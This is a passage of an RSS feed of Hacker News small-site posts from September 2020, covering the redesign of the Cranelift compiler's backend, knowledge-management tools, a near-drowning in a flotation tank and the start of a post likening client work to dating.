a revamp to the instruction selector and backend framework in general that
we‚Äôve been working on for the last nine months or so. This work has been
co-developed with my brilliant colleagues Julian Seward and <a href="https://benj.me/">Benjamin
Bouvier</a>, with significant early input from <a href="https://github.com/sunfishcode">Dan
Gohman</a> as well, and help from all of the
wonderful Cranelift hackers.</p>

<h2 id="background-cranelift">Background: Cranelift</h2>

<p>So what is Cranelift? The project is a compiler framework written in
<a href="https://www.rust-lang.org/">Rust</a> that is designed especially (but not
exclusively) for <a href="https://en.wikipedia.org/wiki/Just-in-time_compilation">just-in-time
compilation</a>. It‚Äôs a
general-purpose compiler: its most popular use-case is to compile
<a href="https://www.webassembly.org/">WebAssembly</a>, though several other frontends
exist, for example,
<a href="https://github.com/bjorn3/rustc_codegen_cranelift">cg_clif</a>, which adapts the
Rust compiler itself to use Cranelift. Folks at Mozilla and several other
places have been developing the compiler for a few years now.  It is the
default compiler backend for
<a href="https://github.com/bytecodealliance/wasmtime">wasmtime</a>, a runtime for
WebAssembly outside the browser, and is used in production in several other
places as well. We recently flipped the switch to turn on Cranelift-based
WebAssembly support in nightly Firefox on <a href="https://en.wikipedia.org/wiki/AArch64">ARM64
(AArch64)</a> machines, including most
smartphones, and if all goes well, it will eventually go out in a stable
Firefox release. Cranelift is developed under the umbrella of the <a href="https://bytecodealliance.org/">Bytecode
Alliance</a>.</p>

<p>In the past nine months, we have built a new framework in Cranelift for the
‚Äúmachine backends‚Äù, or the parts of the compiler that support particular CPU
instruction sets. We also added a new backend for AArch64, mentioned above, and
filled out features as needed until Cranelift was ready for production use in
Firefox. This blog post sets some context and describes the design process that
went into the backend-framework revamp.</p>

<p>It can be a bit confusing to keep all of the moving parts straight. Here‚Äôs a
visual overview of Cranelift‚Äôs place among various other components, focusing
on two of the major Rust crates (the Wasm frontend and the codegen backend) and
several of the other programs that make use of Cranelift:</p>

<p><img src="https://cfallin.org/assets/2020-09-10-cranelift-components.svg" alt="Figure: Cranelift and other components"></p>

<h2 id="old-backend-design-instruction-legalizations">Old Backend Design: Instruction Legalizations</h2>

<p>To understand the work that we‚Äôve done recently on Cranelift, we‚Äôll need to
zoom into the <code>cranelift_codegen</code> crate above and talk about how it <em>used to</em>
work. What is this ‚ÄúCLIF‚Äù input, and how does the compiler translate it to
machine code that the CPU can execute?</p>

<p>Cranelift makes use of
<a href="https://github.com/bytecodealliance/wasmtime/blob/main/cranelift/docs/ir.md">CLIF</a>,
or the Cranelift IR (Intermediate Representation) Format, to represent the code
that it is compiling. Every compiler that performs program optimizations uses
some form of an <a href="https://en.wikipedia.org/wiki/Intermediate_representation">Intermediate Representation
(IR)</a>: you can think
of this like a virtual instruction set that can represent all the operations a
program is allowed to do. The IR is typically simpler than real instruction
sets, designed to use a small set of well-defined instructions so that the
compiler can easily reason about what a program means. The IR is also
independent of the CPU architecture that the compiler eventually targets; this
lets much of the compiler (such as the part that generates IR from the input
programming language, and the parts that optimize the IR) be reused whenever
the compiler is adapted to target a new CPU architecture.  CLIF is in <a href="https://en.wikipedia.org/wiki/Static_single_assignment_form">Static
Single Assignment
(SSA)</a> form, and
uses a conventional <a href="https://en.wikipedia.org/wiki/Control-flow_graph">control-flow
graph</a> with basic blocks
(though it previously allowed extended basic blocks, these have been phased
out). Unlike many SSA IRs, it represents œÜ-nodes with block parameters
rather than explicit œÜ-instructions.</p>

<p>Within <code>cranelift_codegen</code>, before we revamped the backend design, the program
remained in CLIF throughout compilation and up until the compiler emitted the
final machine code. This might seem to contradict what we just said: how can
the IR be machine-independent, but also be the final form from which we emit
machine code?</p>

<p>The answer is that the old backends were built around the concept of
‚Äúlegalization‚Äù and ‚Äúencodings‚Äù. At a high level, the idea is that every
<em>Cranelift</em> instruction either corresponds to one <em>machine</em> instruction, or can
be replaced by a sequence of other <em>Cranelift</em> instructions. Given such a
mapping, we can refine the CLIF in steps, starting from arbitrary
machine-independent instructions from earlier compiler stages, performing edits
until the CLIF corresponds 1-to-1 with machine code. Let‚Äôs visualize this
process:</p>

<p><img src="https://cfallin.org/assets/2020-09-10-cranelift-legalization.svg" alt="Figure: legalization by repeated instruction expansion"></p>

<p>A very simple example of a CLIF instruction that has a direct ‚Äúencoding‚Äù to a
machine instruction is <code>iadd</code>, which just adds two integers. On essentially any
modern architecture, this should map to a simple ALU instruction that adds two
registers.</p>

<p>On the other hand, many CLIF instructions do not map cleanly. Some arithmetic
instructions fall into this category: for example, there is a CLIF instruction
to count the number of set bits in an integer‚Äôs binary representation
(<code>popcount</code>); not every CPU has a single instruction for this, so it might be
expanded into a longer series of bit manipulations. There are operations that
are defined at a higher semantic level, as well, that will necessarily be
lowered with expansions: for example, accesses to Wasm memories are lowered
into operations that fetch the linear memory base and its size, bounds-check
the Wasm address against the limit, compute the real address for the Wasm
address, and perform the access.</p>

<p>To compile a function, then, we iterate over the CLIF and find instructions
with no direct machine encodings; for each, we simply expand into the legalized
sequence, and then recursively consider the instructions in that sequence. We
loop until all instructions have machine encodings. At that point, we can emit
the bytes corresponding to each instruction‚Äôs encoding<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>.</p>

<h2 id="growing-pains-and-a-new-backend-framework">Growing Pains, and a New Backend Framework?</h2>

<p>There are a number of advantages to the legacy Cranelift backend design, which
performs expansion-based legalization with a single IR throughout. As one might
expect, though, there are also a number of drawbacks. Let‚Äôs discuss a few of
each.</p>

<h3 id="single-ir-and-legalization-pros">Single IR and Legalization: Pros</h3>

<ol>
  <li>
    <p>By operating on a single IR all the way to machine-code emission, the same
optimizations can be applied at multiple stages. For example, consider a
legalization expansion that turns a high-level ‚Äúaccess Wasm memory‚Äù
instruction into a sequence of loads, adds and bounds-checks. If many such
sequences occur in one function, we might be able to factor out common
portions (e.g.: computing the base of the Wasm memory).  Thus the
legalization scheme exposes as much code as possible, at as many stages as
possible, to opportunities for optimization. The legacy Cranelift pipeline
in fact works in this way: it runs ‚Äúpre-opt‚Äù and ‚Äúpost-opt‚Äù optimization
passes, before and after legalization respectively.</p>
  </li>
  <li>
    <p>If <em>most</em> of the Cranelift instructions become one machine instruction, and
few legalizations are necessary, then this scheme can be very fast: it
becomes simply a single traversal to fill in ‚Äúencodings‚Äù, which were
represented by small indices into a table.</p>
  </li>
</ol>

<h3 id="single-ir-and-legalization-cons">Single IR and Legalization: Cons</h3>

<ol>
  <li>
    <p>Expansion-based legalization may not always result in
optimal code. So far we‚Äôve seen that legalization can convert from CLIF to
machine instructions with one-to-one or one-to-many mappings. However, there
are sometimes also <em>single</em> machine instructions that implement the behavior of
<em>multiple</em> CLIF instructions, i.e. a many-to-one mapping. In order to generate
efficient code, we want to be able to make use of these instructions.</p>

    <p>For example, on x86, an instruction that references memory can compute an
address like <code>base + scale * index</code>, where <code>base</code> and <code>index</code> are registers
and <code>scale</code> is 1, 2, 4, or 8. There is no notion of such an address mode in
CLIF, so we would want to pattern-match the raw <code>iadd</code> (add) and <code>ishl</code>
(shift) or <code>imul</code> (multiply) operations when they occur in the address
computation. Then, we would want to somehow select the encoding on the
<code>load</code> instruction based on the fact that its input is some specific
combination of adds and shifts/multiplies.  This seems to break the
abstraction that the encoding represents only that instruction‚Äôs operation.</p>

    <p>In principle, we could implement more general pattern matching for legalization
rules to allow many-to-one mappings. However, this would be a significant
refactor; and as long as we were reconsidering the design in whole, there were
other reasons to avoid patching the problem in this way.</p>
  </li>
  <li>
    <p>There is a conceptual difficulty with the single-IR approach: there is
no static representation of which instructions are expanded into which others
and it is difficult to reason about the correctness and termination properties
of legalization as a whole.</p>

    <p>Specifically, the expansion-based legalization rules must obey a partial
order among instructions: if A expands into a sequence including B, then B
cannot later expand into A. In practice, mappings were mostly one-to-one,
and for those that weren‚Äôt, there was a clear domain separation between the
‚Äúinput‚Äù high-level instructions and the ‚Äúmachine-level‚Äù instructions.
However, for more complex machines, or more complex matching schemes that
attempt to make better use of the target instruction set, this could become
a real difficulty for the machine-backend author to keep straight.</p>
  </li>
  <li>
    <p>There are efficiency concerns with expansion-based legalization. At
an algorithmic level, we prefer to avoid fixpoint loops (in this case,
‚Äúcontinue expanding until no more expansions exist‚Äù) whenever possible. The
runtime is bounded, but the bound is somewhat difficult to reason about,
because it depends on the maximum depth of chained expansions.</p>

    <p>The data structures that enable in-place editing are also much slower than
we would like. Typically, compilers store IR instructions in linked lists to
allow for in-place editing. ‚Ä¶</p></li></ol></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cfallin.org/blog/2020/09/18/cranelift-isel-1/">https://cfallin.org/blog/2020/09/18/cranelift-isel-1/</a></em></p>]]>
            </description>
            <link>https://cfallin.org/blog/2020/09/18/cranelift-isel-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518724</guid>
            <pubDate>Fri, 18 Sep 2020 16:22:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Z80, the 8-bit Number Cruncher (2011)]]>
            </title>
            <description>
<![CDATA[
Score 59 | Comments 51 (<a href="https://news.ycombinator.com/item?id=24518158">thread link</a>) | @elvis70
<br/>
September 18, 2020 | http://www.andreadrian.de/oldcpu/Z80_number_cruncher.html | <a href="https://web.archive.org/web/*/http://www.andreadrian.de/oldcpu/Z80_number_cruncher.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://www.andreadrian.de/oldcpu/Z80_number_cruncher.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518158</guid>
            <pubDate>Fri, 18 Sep 2020 15:39:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building an Ideal Knowledge Management System for Content Creators]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24518086">thread link</a>) | @laybak
<br/>
September 18, 2020 | https://knowledgeartist.org/article/ideal-knowledge-management-system-content-creators | <a href="https://web.archive.org/web/*/https://knowledgeartist.org/article/ideal-knowledge-management-system-content-creators">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><span>In this article, I lay out a vision of the dream tools to help content creators manage and apply their cumulative learnings. I outline the desirable properties of such tools and how we can build them.</span></p> <p><span>Let's get started.</span></p>  <p><h3><span>Knowledge Synthesis vs Passive Consumption</span></h3></p> <p><span>I use the term "content creators" to refer to a variety of knowledge workers, including bloggers, video producers, researchers, journalists, and more. The many types of content creators are characterized by a common basic workflow: the process of consuming and synthesizing knowledge. Or more generally, learning and teaching. </span></p> <p><span>This is distinct from the mere passive consumption of information. It involves digesting information, trying to apply it, condensing it, sharing it, and making it your own. In the process, you understand the knowledge better yourself. And the output you create helps others learn.</span></p>  <p><h3><span>Ease of Capture</span></h3></p> <p><span>As you read, learn, or just live life, you come across many tidbits and ideas you want to remember. These are inspirations and materials that you can later make use of. </span></p> <p><span>But if you don't capture these ideas, you tend to lose them forever. And it is hard to generate relevant ideas on demand when you need them. So capturing is an always-on process, and your collection of ideas grows over time.</span></p> <p><span>The challenge with capturing ideas is that it is hard to know in advance when you will need them. If the friction to capture is too high, it simply won't happen. The capturing process must be effortless. </span></p>  <p><h3><span>Save from Anywhere</span></h3></p> <p><span>Ideas can come to you in many different contexts: conversations with friends, newsletters, books, podcasts, documentaries, walking a dog in the park, etc. The best ways to capture ideas are different for each scenario. You want to go with whichever method is the most convenient in the moment so you can resume whatever activity you were doing. </span></p> <p><span>As technology evolves, we would have an increasing variety of platforms or media we can use to save ideas. Currently, you can write it down on a piece of paper, take notes on your phone, leave a bookmark, highlight the passage, take a screenshot, and more.</span></p> <p><span>But in the future it seems inevitable that we would incorporate additional modes of inputs such as wearables like glasses with cameras, virtual reality recordings, and brain-computer interfaces.</span></p>  <p><h3><span>Integrated and Queryable Knowledge</span></h3></p> <p><span>As you use multiple tools, a problem that arises over time is that your captured knowledge becomes scattered across different places. Using a fragmented set of tools to manage your knowledge is costly. It makes it harder to retrieve any information you need. </span></p> <p><span>Currently, your book notes, product specs, and notes for online courses likely live in disparate platforms. We can do better. Your information should not be siloed. It should be searchable in one place. </span></p>  <p><h3><span>Customizable and Extensible</span></h3></p> <p><span>It is unlikely that any single tool will be the best knowledge management solution for all scenarios and workflows. No matter how well-designed a product is, there are use cases that are not accounted for, or are de-prioritized due to resource constraints. The best knowledge management tools you use should be extensible to fit your nuanced needs. Each tool you use needs to work well with the other components in your workflow, over a shared standard, open source code, or API. </span></p>  <p><h3><span>Free-form Digital Drawing</span></h3></p> <p><span>If I ask you to explain an abstract concept, one of the first things you would reach for is probably a pen, then paper or a whiteboard. This free-form drawing medium is expressive. It makes use of our spatial intuition. It is free-form. It helps you see otherwise non-obvious connections. But it is inconvenient to store, retrieve, and connect to existing knowledge. </span></p> <p><span>In contrast, a digital interface is easy to manipulate across platforms, but tends to be limited in expression. It tends to rely on text representation, which is often insufficient in conveying an idea, especially a complicated or abstract one.</span></p> <p><span>An ideal knowledge management system would marry the two to get us the best of both worlds: a digital interface that affords frictionless free-form drawing and is easy to maintain. Products such as </span> <a href="https://miro.com/" target="_blank"><span>Miro</span></a> <span> and </span> <a href="https://www.onenote.com/" target="_blank"><span>OneNote</span></a> <span> are a good step in this direction. </span></p>  <p><h3><span>Structured Knowledge &amp; Personal Knowledge Graph</span></h3></p> <p><span>The most common digital form of an idea is a </span> <em>note</em> <span>, typically stored in plaintext and organized in notebooks or folders. This is usually sufficient for the purpose of jotting down your thoughts. </span></p> <p><span>But these generic "Note" objects can become more useful when they are augmented with properties, relationships with other notes, and other metadata. These properties can be automatically extracted in the capturing process (e.g. "page number" and "book title" in a e-Book highlight), or custom-defined by the user (e.g. "years of experience required" on a "Job Posting" page). </span></p> <p><span>The interconnections between these individual notes can be structured in a </span> <a href="https://en.wikipedia.org/wiki/Knowledge_Graph" target="_blank"><span>knowledge graph</span></a> <span>, where an entity "Google" is connected to a collection of "Job" entities via the relationship "is hiring". A knowledge graph can be valuable in retrieving knowledge and answering queries. And search engines make extensive use of this to structure the world's knowledge. And on an individual level, </span> <em>personal knowledge graphs</em> <span> can have many interesting use cases for retrieval and automation. Tools like </span> <a href="https://www.notion.so/" target="_blank"><span>Notion</span></a> <span>, </span> <a href="https://coda.io/" target="_blank"><span>Coda</span></a> <span>, and </span> <a href="https://roamresearch.com/" target="_blank"><span>Roam Research</span></a> <span> offer more options for structuring knowledge for individual users. But this is just the beginning.</span></p>  <p><h3><span>Autosuggest for Thoughts</span></h3></p> <p><span>With richer representations of knowledge, machines can better "understand" our thoughts and compute on them. This can help streamline (or even automate) much of the research and idea generation workflows. </span></p> <p><span>Imagine this: when you are writing about a topic, your knowledge base can suggest semantically relevant content, either from your existing data, your team, or the collective knowledge on the web. You would no longer have to switch contexts to look up simple facts. Rather, thoughts can flow frictionlessly from inside your head to external digital artifacts that you can edit and share.</span></p> <p><span>And with generative language models (such as the </span> <a href="https://openai.com/blog/openai-api/" target="_blank"><span>GPT</span></a> <span>) maturing, you can provide a skeletal structure of your ideas, and have AI models complete your thoughts. Instead of guessing and generating random tokens, the model's outputs would be based on your thoughts that have already been digitized in your system.  </span></p> <p><span>With this close collaboration with machines in your knowledge work, information becomes truly at your fingertips.</span></p>  <p><h3><span>Prefer simple over complex</span></h3></p> <p><span>Complexity can creep in any system. Technology tools tend to get bloated over time. An initially focused feature set can turn into a maze of confusing and loosely related features. A constant challenge for feature-rich tools is discoverability of functionalities without cluttering the UI. These tools are supposed to save you time. It would defeat the purpose of using the tool if it takes longer to make it work the way you want than to work without it. </span></p> <p><span>To this end, </span> <a href="https://www.notion.so/" target="_blank"><span>Notion</span></a> <span> has raised the bar for simplicity for knowledge management tools. </span> <a href="https://www.figma.com/" target="_blank"><span>Figma</span></a> <span> also does a good job for hiding its rich feature set behind contextual actions.</span></p>  <p><h3><span>Shared, Collaborative Knowledge Structures</span></h3></p> <p><span>Knowledge synthesis is collaborative by nature. You consume works created by others and in turn create yours by mixing in your knowledge and experience. Knowledge management systems can accelerate this collaboration and empower every individual to leverage and build on each other's work as much as possible.</span></p> <p><span>Instead of knowledge being siloed within disciplines and locked inside individuals' minds, there is tremendous potential for tools to enable individuals to contribute to a collective knowledge structure, while saving time from having to build their own from scratch. The successes of platforms such as Wikipedia and open source software development are encouraging. We can build towards a future where individuals expose and attach parts of their private knowledge base to a public topic entity for others to fork for their own use. And this process can even be automated at some point.</span></p>  <p><span>We live in an exciting time for content creators and for innovation in the knowledge management space. The above are some of the promising directions for development, to work towards accelerating learning, making new discoveries, and making progress towards solving big problems.</span></p> <p><span>To contribute to this vision, I recently open sourced an extensible </span> <a href="https://github.com/jhlyeung/rumin-web-clipper" target="_blank"><span>web clipper browser extension</span></a> <span>, and I am working towards a few of the directions outlined above with </span> <a href="https://getrumin.com/" target="_blank"><span>Rumin</span></a> <span>. If you would like to chat about this further, feel free to </span> <a href="https://twitter.com/jhlyeung" target="_blank"><span>get in touch on Twitter</span></a> <span>.</span></p>        


          
            
            <p><em>Each week, I send out a newsletter where I share my learnings, new ways to see things, and new ways to feel.</em></p>
            <p><em>Enter your email below to subscribe.</em></p>

            
          
        </div></div>]]>
            </description>
            <link>https://knowledgeartist.org/article/ideal-knowledge-management-system-content-creators</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518086</guid>
            <pubDate>Fri, 18 Sep 2020 15:34:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A sensory deprivation flotation tank almost drowned me]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24518073">thread link</a>) | @nsomani
<br/>
September 18, 2020 | https://saffronhuang.com/post/a-sensory-deprivation-flotation-tank-almost-drowned-me/ | <a href="https://web.archive.org/web/*/https://saffronhuang.com/post/a-sensory-deprivation-flotation-tank-almost-drowned-me/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemprop="articleBody" id="content">
        <p>Yesterday, I almost drowned in a sensory deprivation flotation tank when my hair was sucked into the filtration system. I was not told about much of the actual float procedure nor the existence of an emergency button, which I couldn‚Äôt reach anyway. No one was meant to check in on me. This is a horror story about losing agency to an automated system featuring, as I discovered, no real contingency plans.</p>

<p>I turned 23 recently. For my birthday, a few of my friends gave me a float voucher as I‚Äôd mentioned an interest in trying it. It‚Äôs the kind of unusual sensory experience that piques my curiosity. But at $100 NZD for an hour-long session, it‚Äôs also a potential source of buyer‚Äôs remorse that I‚Äôd prefer someone else pay for. A birthday, I figure, is an excuse for frivolity.</p>

<p>As the only employee on duty, let‚Äôs call her Anna, was stepping me through the procedure, I asked her, ‚ÄúShould I tie my hair up?‚Äù</p>

<p>‚ÄúNo, don‚Äôt worry about it,‚Äù she responded. She told me about the extreme salinity of the water, and that there was a blue button in the tank to turn the lights on inside‚Äîbut that in the interests of full relief and relaxation, it was best to lay in complete darkness. I was instructed to shower before getting in the tank, and as I was doing so I once more casually thought about tying my hair up. I decided against it, since I was told to shower again afterwards and it would be a hassle to untie wet hair. Anyway, there seemed to be no benefit to it, as espoused by Anna‚Äôs response.</p>

<p>I got out of the shower and put the earplugs in, as she‚Äôd advised, to keep the water out of my ears. I dipped a foot into the tank, testing the warmth of the water. I could almost taste traces of salt in the air‚Äîapparently, there were 5kgs of epsom salt dissolved in this small pod. This would be more than enough to keep me afloat. Anna had told me not to touch my face, and particularly not my eyes; the heavy sting of the salt would quickly spoil any attempt at tranquility.</p>

<p>Music would play for the first ten minutes and the last five minutes of the hour-long float. The initial music was intended to relax me; the music at the end would serve as the signal that my time was up. As I laid down in the water, I pulled the lid of the tank down. The lights both inside and outside the tank slowly blinked off.</p>

<p>Feeling both curious and skeptical, I made mental note of what I was experiencing and how I was feeling. I could move my limbs around entirely frictionlessly and weightlessly, so I did that. I tried pushing my arms down and felt the resistance of the water‚Äôs salinity. I lightly paddled my hands and felt waves of water sweep up my body, brushing my face. I couldn‚Äôt yet tell if the muscles in my neck or shoulders were any looser. I tried to meditate on my breath. As my eyes adjusted to the dark, sparks danced across my vision, and faded. (Unfortunately, I can‚Äôt report actual hallucinations, which some people experience.)</p>

<p>I could barely hear the music through both the earplugs and the water it kept out. I planned to text my friends afterwards with jokes about returning to the womb, slipping around a watery cocoon in absolute darkness and, once the ten minutes of music ended, absolute silence.</p>

<p>It‚Äôs common to fall asleep during a float. I read the business‚Äôs online FAQ, where they reassure floaters-to-be that they wouldn‚Äôt drown if they fell asleep. The salts would keep them afloat, and if they were to turn over the water would immediately wake them. I really lost my sense of time in there, but I think I became sleepy and hypnagogic perhaps 30 minutes in, and‚Äîalthough I made some attempt at staying alert‚ÄîI started drifting in and out of wakefulness.</p>

<p>At some point I felt a mild tugging sensation on my scalp. Hmm, weird. I thought it was just my head bumping against the side of the tank, but I felt around with my hand and found that a good chunk of my hair had become pulled into a head-height vent at the top of the tank. This was not a few strands; it was, if compressed, a coin-sized diameter of hair being pulled, leaving increasingly little length from the skin of my scalp, and increasingly little freedom of movement.</p>

<p><em>Fuck.</em> I had to get loose. My face was only an inch above water. Maybe if I pulled with all my body‚Äôs might, I could free myself. Adrenaline surged; I tugged as hard as I could, and in the process I flipped over and swallowed a mouthful of disgustingly salty water. My eyes stung, hard. When I eventually was able to come up for air and still myself, I spluttered and spat out water, and told myself that my first priority was to keep my face up, and stay calm. Drowning in a flotation tank was not going to be the way I died.</p>

<p>My hair was so solidly ensnared in the vent that there was no way I could pull the strands loose, or break them off. A mere bundle of keratin is unreasonably strong. I tried to tie the rest of my hair up with the hairband on my wrist, bunching it in an attempt to prevent more from being sucked up.</p>

<p>I‚Äôd seen a red button near the opening of the tank. No one had told me what it was, but I figured that was the emergency button. (Later, Anna told me that it doesn‚Äôt work, anyway. Even later, her manager disputed that claim, saying that the emergency button does work. As you can see, things are maximally confusing.) However, as I was glued to the other end of the tank, I couldn‚Äôt reach it.</p>

<p>I yelled into pitch black.</p>

<p>HELP!!!</p>

<p>I wrenched away the earplugs, trying to hear anything. No response.</p>

<p>I kicked, and managed to get the lid of the tank up a little bit. I told myself I just needed to hold on until she came to check on me, but I had no idea how long that might be. I couldn‚Äôt see, I couldn‚Äôt hear, I was floating in water and unable to free myself. I have something of a phobia of drowning; every time I‚Äôve had to swim in deep bodies of water (e.g. for ‚Äúfun‚Äù school activities), I‚Äôve been unduly anxious. I was very aware of the perimeter of water partially submerging my face, ebbing up and down. I tried not to hyperventilate‚Äînot endangering my breath was very important. I felt entirely vulnerable, and entirely terrified.</p>

<p>I yelled a few more times, and finally I heard her anxious voice at the door. ‚ÄúAre you alright?‚Äù ‚ÄúNO?!?! I‚Äôm trapped!‚Äù Eventually, ‚ÄúCan I come in?‚Äù <em>What the fuck, please come in!</em></p>

<p>She was on the phone with her manager as she tried to figure out what to do. I told her to get scissors.</p>

<p>‚ÄúI‚Äôm shaking,‚Äù she said as she worked on cutting through my hair.</p>

<p>I sat up and coughed heavily, trying to expel the water from my system. When I looked in the mirror, my hair looked like it was done in a giant messy bun at the crown. And that was the part that <em>wasn‚Äôt</em> tied up (in fact, I‚Äôd only managed to tie a small amount with the hairband). It was that tangled. My eyes were salt-swollen and red, and the drying crystals had started to cake my face. I felt so sad, and so relieved.</p>

<p>‚ÄúYou told me not to tie my hair up!‚Äù was the first thing I blurted when I eventually came out to the front desk.</p>

<p>‚ÄúWell yeah, you didn‚Äôt have to!‚Äù</p>

<p>I was stunned. ‚ÄúWhat?‚Äù</p>

<p>‚ÄúDidn‚Äôt you hear the music?‚Äù Anna asked me as a response.</p>

<p>Apparently, the five minutes of music at the end and a voice instructing me to leave the tank should have been my cue to get out. I also learned that a filtration system automatically starts to pump after the music ends. But with the earplugs in as instructed, and having either fallen asleep or been in a state of hypnagogia, I couldn‚Äôt tell her whether the music had actually played or not. Even if it had played, the initial music had been so faint, I doubted its ability to wake anyone. Again, it‚Äôs common to fall asleep in a float tank, as it is deliberately relaxing. In fact, some people <a href="https://slate.com/human-interest/2015/11/i-slept-all-night-in-a-sensory-deprivation-tank.html">intentionally sleep in one at night</a>. I‚Äôm not a heavy sleeper, either; I never miss a morning alarm.</p>

<p>They programmed the tank to start the filtration immediately, without effective alarms, or checking that I‚Äôd actually gotten out. There exist flotation tanks with sensors, which could have automatically delayed the filtration process until no movement is detected; at the very least, a gentle knock on the door informing me that my time was up doesn‚Äôt seem much to ask. Anna said that she‚Äôd noticed I wasn‚Äôt out after my session and hadn‚Äôt turned the shower on yet, but thought nothing of checking on me to see if things were going okay.</p>

<p>The manager called me tonight, which was illuminating. I found out that:</p>

<ol>
<li>I had not been told that there was a correct orientation to lie down in. My head should have been near the opening of the tank, but it was towards the end with the vent. (Although it seems from Google Images that people have laid in it both ways.)</li>
<li>I should have been told that the emergency button existed and how to use it. I‚Äôd only inferred it from seeing the red button.</li>
<li>I should have been walked through the entire flotation system, and been informed that the filtration pipes would start after my session ended; I was not.</li>
<li>The music at the end is supposed to be a soft, gentle awakening, not a loud alarm, which confirmed my suspicions. Especially if they also advise putting in earplugs, I think they should have mentioned that it might be hard to hear.</li>
<li>In her experience, 1 of 50 people sleep through the music and have stayed in there once the filtration starts. I assume that none of them have gone in the wrong way or had long hair. If they knew that people do sleep through the music, I wonder why it was not procedural to check on me. I had to yell multiple times to get any attention.</li>
</ol>

<p>She told me that she would run tests on whether the music had been loud enough in my specific tank, and placed a lot of blame on Anna, the only employee present, who had worked there for only two months. She was clearly very concerned about her business; as a result, it‚Äôs hard to know whether the procedures that she claimed are normally followed are actually in practice.</p>

<p>It seems like multiple parts of the system were ill-considered, or simply ‚Ä¶</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://saffronhuang.com/post/a-sensory-deprivation-flotation-tank-almost-drowned-me/">https://saffronhuang.com/post/a-sensory-deprivation-flotation-tank-almost-drowned-me/</a></em></p>]]>
            </description>
            <link>https://saffronhuang.com/post/a-sensory-deprivation-flotation-tank-almost-drowned-me/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518073</guid>
            <pubDate>Fri, 18 Sep 2020 15:33:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: ugit ‚Äì Learn Git Internals by Building Git in Python]]>
            </title>
            <description>
<![CDATA[
Score 223 | Comments 23 (<a href="https://news.ycombinator.com/item?id=24517925">thread link</a>) | @nikital
<br/>
September 18, 2020 | https://www.leshenko.net/p/ugit/ | <a href="https://web.archive.org/web/*/https://www.leshenko.net/p/ugit/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <p>Loading...</p>
    <section>
        
        
        
    </section>

    <section>
        
        
        <details>
            <summary>Download</summary>
            <p><span>Clone Œºgit using:</span>
                <span id="clone-cmd"></span>
                

                <span>Checkout this commit:</span>
                <span id="checkout-cmd"></span>
                
            </p>
        </details>
    </section>

    

    

    

    


</div>]]>
            </description>
            <link>https://www.leshenko.net/p/ugit/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517925</guid>
            <pubDate>Fri, 18 Sep 2020 15:22:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dating Our Clients]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24517907">thread link</a>) | @mcrittenden
<br/>
September 18, 2020 | https://critter.blog/2020/09/18/dating-our-clients/ | <a href="https://web.archive.org/web/*/https://critter.blog/2020/09/18/dating-our-clients/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main">

	
<article id="post-1408">

	
<!-- .entry-header -->

	<div>

		<div>

			
<p>Client relationships have a lot in common with romantic relationships. This is <a href="https://creative-boost.com/client-relationships-are-like-dating/">well</a> <a href="https://www.leightoninteractive.com/blog/how-a-client-relationship-is-like-dating">documented</a> <a href="https://www.birdseed.io/business-customer-relationship-lot-like-dating/">elsewhere</a>. </p>



<p>Let‚Äôs start with the obvious parallels:</p>



<ul><li><em>Flirting and courting</em> = the sales process and trying to win the bid</li><li><em>Facebook official</em> = signing the contract</li><li><em>The honeymoon phase</em> = the first couple sprints when everything is still exciting and new</li><li><em>The first fight</em> = the first disagreement (often about scope)</li><li><em>The messy breakup </em>= using the termination clause in the contract</li><li><em>The amicable breakup </em>= a successful completion of the project</li><li><em>The messy divorce </em>= someone gets sued</li><li><em>The long term relationship = </em>a trusting partnership with no end date (this is the holy grail for many people, but not all)</li></ul>



<p>‚Äú<em>But romantic relationships are about love! Client relationships are about money! That is an important difference!</em>‚Äù That‚Äôs why I didn‚Äôt say that client relationships are <em>exactly </em>like romantic ones. But to be fair, aren‚Äôt both love and money about mutual benefit?</p>



<p>I could keep going and start talking about where kids and joint mortgages fit in, but it all gets very boring.</p>



<p>It‚Äôs more interesting when we apply the power dynamics of romantic relationships. Esther Perel, a well known psychotherapist and speaker, was <a href="https://tim.blog/2017/05/21/esther-perel/">on the Tim Ferriss podcast</a> a few years back. She said something that stuck with me enough to motivate me to spend 15 minutes finding the exact quote:</p>



